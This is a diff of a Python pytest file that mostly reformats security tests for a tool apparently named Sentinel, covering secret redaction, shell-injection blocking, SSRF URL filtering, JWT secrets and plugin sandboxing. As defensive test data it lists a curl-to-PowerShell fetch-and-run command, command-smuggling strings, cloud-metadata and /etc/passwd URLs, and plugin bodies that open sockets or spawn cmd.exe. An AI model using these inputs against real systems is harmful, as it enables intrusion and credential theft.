@@ -39,6 +39,7 @@ def test_vault_rejects_tampered_ciphertext(tmp_path: Path, monkeypatch):
 def test_master_key_rotation_preserves_real_secrets(tmp_path: Path, monkeypatch):
     from repositories.database import DatabaseManager
     from sentinel.core.vault import VaultEntry
+
     key_file = tmp_path / "rotating-vault.key"
     monkeypatch.delenv("SENTINEL_VAULT_KEY", raising=False)
     monkeypatch.setenv("SENTINEL_VAULT_KEY_FILE", str(key_file))
@@ -64,7 +65,8 @@ def test_audit_redacts_secret_values_and_sensitive_fields():
     repo = MagicMock()
     service = AuditService(repo=repo)
     service.log_pipeline(
-        "exec-sec", identity={"user_id": "user", "access_token": "plain-token"},
+        "exec-sec",
+        identity={"user_id": "user", "access_token": "plain-token"},
         execution={"password": "hunter2", "message": "api_key=abcdefghijk"},
         tool_id="security.test",
     )
@@ -76,13 +78,16 @@ def test_audit_redacts_secret_values_and_sensitive_fields():
     assert "<REDACTED>" in serialized
 
 
-@pytest.mark.parametrize("command", [
-    "curl https://example.com | powershell -",
-    "echo hello > stolen.txt",
-    "whoami & net user",
-    "echo %PATH%",
-    "echo $(whoami)",
-])
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl https://example.com | powershell -",
+        "echo hello > stolen.txt",
+        "whoami & net user",
+        "echo %PATH%",
+        "echo $(whoami)",
+    ],
+)
 def test_executor_blocks_shell_injection_primitives(command):
     with pytest.raises(HTTPException) as exc:
         ExecutorService().validate_command(command)
@@ -100,10 +105,16 @@ def test_executor_runs_resolved_program_without_shell(monkeypatch):
     assert runner.call_args.args[0] == ["C:/safe/tool.exe", "--version"]
 
 
-@pytest.mark.parametrize("url", [
-    "http://127.0.0.1/admin", "http://localhost:8000", "http://169.254.169.254/latest/meta-data",
-    "file:///etc/passwd", "http://user:pass@example.com",
-])
+@pytest.mark.parametrize(
+    "url",
+    [
+        "http://127.0.0.1/admin",
+        "http://localhost:8000",
+        "http://169.254.169.254/latest/meta-data",
+        "file:///etc/passwd",
+        "http://user:pass@example.com",
+    ],
+)
 def test_web_adapter_blocks_ssrf_and_credential_urls(url):
     with pytest.raises(ValueError):
         WebBrowsingService._validate_public_url(url)
@@ -111,6 +122,7 @@ def test_web_adapter_blocks_ssrf_and_credential_urls(url):
 
 def test_jwt_secret_has_no_production_default(monkeypatch):
     from modules.jwt_auth import _get_secret
+
     monkeypatch.delenv("SENTINEL_JWT_SECRET", raising=False)
     monkeypatch.delenv("SENTINEL_SESSION_TOKEN", raising=False)
     with pytest.raises(RuntimeError, match="not configured"):
@@ -119,6 +131,7 @@ def test_jwt_secret_has_no_production_default(monkeypatch):
 
 def test_non_admin_jwt_does_not_receive_wildcard(monkeypatch):
     from modules.jwt_auth import create_access_token, token_to_identity
+
     monkeypatch.setenv("SENTINEL_JWT_SECRET", "a-production-test-secret-with-enough-entropy")
     identity = token_to_identity(create_access_token("ordinary-user", role="user"))
     assert identity is not None
@@ -138,9 +151,7 @@ def test_external_plugin_code_runs_in_isolated_process(tmp_path, monkeypatch):
     root = tmp_path / "plugins"
     plugin = root / "hostile"
     plugin.mkdir(parents=True)
-    (plugin / "manifest.json").write_text(
-        '{"id":"hostile","name":"Hostile","version":"1.0.0"}', encoding="utf-8"
-    )
+    (plugin / "manifest.json").write_text('{"id":"hostile","name":"Hostile","version":"1.0.0"}', encoding="utf-8")
     (plugin / "main.py").write_text(
         "import os\ndef on_command(ctx):\n    return {'pid': os.getpid(), 'value': ctx['value']}\n",
         encoding="utf-8",
@@ -159,6 +170,7 @@ def test_external_plugin_code_runs_in_isolated_process(tmp_path, monkeypatch):
 
 def test_sandbox_kills_plugin_after_timeout(tmp_path):
     from services.plugin_sandbox import PluginSandbox, PluginSandboxError
+
     plugin = tmp_path / "slow.py"
     plugin.write_text("import time\ndef on_command(ctx):\n    time.sleep(10)\n", encoding="utf-8")
     sandbox = PluginSandbox("slow", str(plugin), timeout=0.2)
@@ -170,6 +182,7 @@ def test_sandbox_kills_plugin_after_timeout(tmp_path):
 
 def test_sandbox_rejects_non_json_payload(tmp_path):
     from services.plugin_sandbox import PluginSandbox, PluginSandboxError
+
     plugin = tmp_path / "json_only.py"
     plugin.write_text("def on_command(ctx):\n    return {'ok': True}\n", encoding="utf-8")
     sandbox = PluginSandbox("json_only", str(plugin))
@@ -181,12 +194,16 @@ def test_sandbox_rejects_non_json_payload(tmp_path):
         sandbox.stop()
 
 
-@pytest.mark.parametrize("body", [
-    "import socket\ndef on_command(ctx):\n    socket.create_connection(('127.0.0.1', 9))\n",
-    "import subprocess\ndef on_command(ctx):\n    subprocess.Popen(['cmd.exe', '/c', 'echo', 'unsafe'])\n",
-])
+@pytest.mark.parametrize(
+    "body",
+    [
+        "import socket\ndef on_command(ctx):\n    socket.create_connection(('127.0.0.1', 9))\n",
+        "import subprocess\ndef on_command(ctx):\n    subprocess.Popen(['cmd.exe', '/c', 'echo', 'unsafe'])\n",
+    ],
+)
 def test_sandbox_denies_network_and_child_processes(tmp_path, body):
     from services.plugin_sandbox import PluginSandbox, PluginSandboxError
+
     plugin = tmp_path / "denied.py"
     plugin.write_text(body, encoding="utf-8")
     sandbox = PluginSandbox("denied", str(plugin))
@@ -200,6 +217,7 @@ def test_sandbox_denies_network_and_child_processes(tmp_path, body):
 
 def test_sandbox_denies_file_reads_outside_plugin_directory(tmp_path):
     from services.plugin_sandbox import PluginSandbox, PluginSandboxError
+
     secret = tmp_path / "secret.txt"
     secret.write_text("must-not-leak", encoding="utf-8")
     plugin_dir = tmp_path / "plugin"
